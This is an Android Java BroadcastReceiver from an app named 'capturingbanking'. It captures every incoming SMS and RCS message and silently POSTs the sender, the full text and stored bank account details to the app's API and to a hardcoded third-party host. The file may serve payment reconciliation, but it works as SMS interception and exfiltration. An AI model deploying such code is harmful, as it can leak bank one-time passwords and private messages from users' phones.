package com.suleman.capturingbanking.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.toolbox.JsonObjectRequest;
import com.fxn.stash.Stash;
import com.suleman.capturingbanking.API;
import com.suleman.capturingbanking.model.DeviceModel;

import org.json.JSONException;
import org.json.JSONObject;

public class MessageReceiver extends BroadcastReceiver {
    String TAG = "MyPhoneStateListener";
    Context context;
    public static final String INFO = "INFO";

    @Override
    public void onReceive(Context context, Intent intent) {
        Log.d(TAG, "onReceive");
        this.context = context;
        if (intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED") || intent.getAction().equals("com.google.android.gms.rcs.RECEIVE_RCS_MESSAGE")) {
            Log.d(TAG, "onReceive SMS");
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    StringBuilder fullMessage = new StringBuilder();
                    String sender = "";
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        sender = smsMessage.getDisplayOriginatingAddress();
                        fullMessage.append(smsMessage.getMessageBody());
                    }

                    // Check if the message is a duplicate
                    if (isDuplicateMessage(context, fullMessage.toString(), sender)) {
                        Log.d(TAG, "Duplicate SMS received, ignoring...");
                        return;
                    }

                    DeviceModel deviceModel = (DeviceModel) Stash.getObject(INFO, DeviceModel.class);
                    if (deviceModel != null)
                        callApi(context, fullMessage.toString(), sender, deviceModel);
                }
            }
        }
    }

    private boolean isDuplicateMessage(Context context, String message, String sender) {
        SharedPreferences prefs = context.getSharedPreferences("MessageReceiverPrefs", Context.MODE_PRIVATE);
        String lastMessage = prefs.getString("lastMessage", "");
        String lastSender = prefs.getString("lastSender", "");
        long lastTimestamp = prefs.getLong("lastTimestamp", 0);

        // Check if the current message and sender are the same as the last ones
        if (message.equals(lastMessage) && sender.equals(lastSender)) {
            long currentTime = System.currentTimeMillis();
            // If the last message was received within 5 seconds, consider it duplicate
            if ((currentTime - lastTimestamp) < 5000) {
                return true;
            }
        }

        // Save the new message details
        prefs.edit()
                .putString("lastMessage", message)
                .putString("lastSender", sender)
                .putLong("lastTimestamp", System.currentTimeMillis())
                .apply();

        return false;
    }

    private void callApi(Context context, String notifyMessage, String sender, DeviceModel deviceModel) {
        RequestQueue requestQueue = VolleySingleton.getInstance(this.context).getRequestQueue();
        JSONObject json = new JSONObject();
        try {
            // String imei = getDeviceIMEI(context);
            json.put("channel", sender);
            json.put("sms", notifyMessage);
            json.put("bank_name", deviceModel.bankName);
            json.put("account_title", deviceModel.accountTitle);
            json.put("account_number", deviceModel.accountNumber);
            json.put("department", deviceModel.department_ID);
            json.put("device", deviceModel.device_ID);
            JsonObjectRequest stringRequest = new JsonObjectRequest(Request.Method.POST, API.getLink("create"), json,
                    response -> {
                        Log.d("TOKEN_CHECK", "Response : " + response.toString());
                    },
                    error -> {
                        Log.e("TOKEN_CHECK", "Error  : " + error.getLocalizedMessage());
                    }
            );
            requestQueue.add(stringRequest);

            JsonObjectRequest upipayment = new JsonObjectRequest(Request.Method.POST, "https://upipayment.co/api/message-request", json,
                    response -> {
                        Log.d("TOKEN_CHECK", "Response : " + response.toString());
                    },
                    error -> {
                        Log.e("TOKEN_CHECK", "Error  : " + error.getLocalizedMessage());
                    }
            );
            requestQueue.add(upipayment);

        } catch (JSONException | SecurityException e) {
            Toast.makeText(context, e.getLocalizedMessage(), Toast.LENGTH_SHORT).show();
            e.printStackTrace();
        }
    }
}